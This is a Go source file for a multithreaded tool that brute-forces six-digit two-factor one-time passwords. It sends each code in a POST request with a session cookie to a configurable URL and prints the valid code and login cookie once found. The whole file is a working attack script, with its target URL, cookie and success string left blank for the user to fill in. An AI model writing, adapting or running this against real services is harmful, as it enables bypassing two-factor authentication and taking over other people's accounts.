package main

import (
	"bytes"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var url = ""
var cookieName = ""
var cookieVal = ""
var wg sync.WaitGroup
var successString = ""

// Create channel with boolean check for closing routines on success
var quit = make(chan bool)

// Max possible combinations. Defaulting to one above to avoid dealing with floats
var maxCombinations = 1000000

// Number of threads
var maxThreads = 5

// Attempts per thread - 50,000
var otpTranche = maxCombinations / maxThreads

var start = time.Now()

func main() {
	fmt.Println("----- System Info ----- ")
	fmt.Println("[>] OS: ", runtime.GOOS)
	fmt.Println("[>] Architecture: ", runtime.GOARCH)
	fmt.Println("[>] CPU Cores: ", runtime.NumCPU())

	fmt.Println("[*] Beginning bruteforce of 2FA OTP.")

	fmt.Println("[*] Initialising routines: ", maxThreads)

	// Create goroutines for each of n sections of tokens
	for r := 1; r <= maxThreads; r++ {
		wg.Add(1)
		go runThreads(r)
	}
	fmt.Println("[>] All routines active.")
	fmt.Println("[>] Time now: ", start)
	fmt.Println("[>] Active routines count: ", runtime.NumGoroutine())
	fmt.Println("[!] Attack running. Wait. ")

	wg.Wait()
}

func runThreads(threadNum int) {
	// Default return values for POST request
	success := false
	defaultCookie := ""
	defer wg.Done()
	limit := threadNum * otpTranche
	for i := limit - otpTranche; i <= limit; i++ {
		otp := generateOtp(i)
		select {
		case <-quit:
			return
		default:
			if len(otp) > 6 {
				continue
			} else {
				success, loginCookie := sendPost(otp, success, defaultCookie)
				if success {
					fmt.Println("[>>] OTP Found: " + otp)
					fmt.Println("[>>] Login Cookie: " + loginCookie)
					finish := time.Now()
					fmt.Println("[>] Time completed: ", finish)
					fmt.Println("[>] Time elapsed: ", finish.Sub(start))
					close(quit)
				}
			}
		}
	}
}

// Generate OTP string from supplied int and ensures value is always of length 6 with leading zeros
func generateOtp(otpInt int) string {
	otpStr := strconv.Itoa(otpInt)
	otpLength := 6
	lengthDiff := otpLength - len(otpStr)
	for i := 0; i <= lengthDiff-1; i++ {
		// Prepend leading zeros if less than 6 chars
		otpStr = "0" + otpStr
	}
	return otpStr
}

func sendPost(otp string, success bool, token string) (bool, string) {
	// Create JSON body with 2FA value
	requestBody, err := json.Marshal(map[string]string{
		"value": otp,
	})

	if err != nil {
		log.Fatal(err)
	}

	// set request timeout
	timeout := time.Duration(30 * time.Second)
	client := http.Client{
		Timeout: timeout,
	}

	// Set request HTTP headers including cookie value
	request, err := http.NewRequest("POST", url, bytes.NewBuffer(requestBody))
	cookie := strings.Join([]string{cookieName, "=", cookieVal}, "")
	request.Header.Set("Cookie", cookie)
	request.Header.Set("Content-Type", "application/json")
	if err != nil {
		log.Fatalln(err)
	}

	// Send request
	res, err := client.Do(request)
	if err != nil {
		log.Fatalln(err)
	}

	// Check if the server has set a new cookie
	if res.Header["Set-Cookie"] != nil {
		token = res.Header.Get("Set-Cookie")
	}

	defer res.Body.Close()

	// Read response data
	body, err := ioutil.ReadAll(res.Body)
	if err != nil {
		log.Fatalln(err)
	}

	// If json body is == 'null' and a token has been set by the server then a reset has been successful
	if strings.Contains(string(body), successString) && token != "" {
		return true, token
	}

	// Otherwise return default values indicating no reset
	return success, token
}
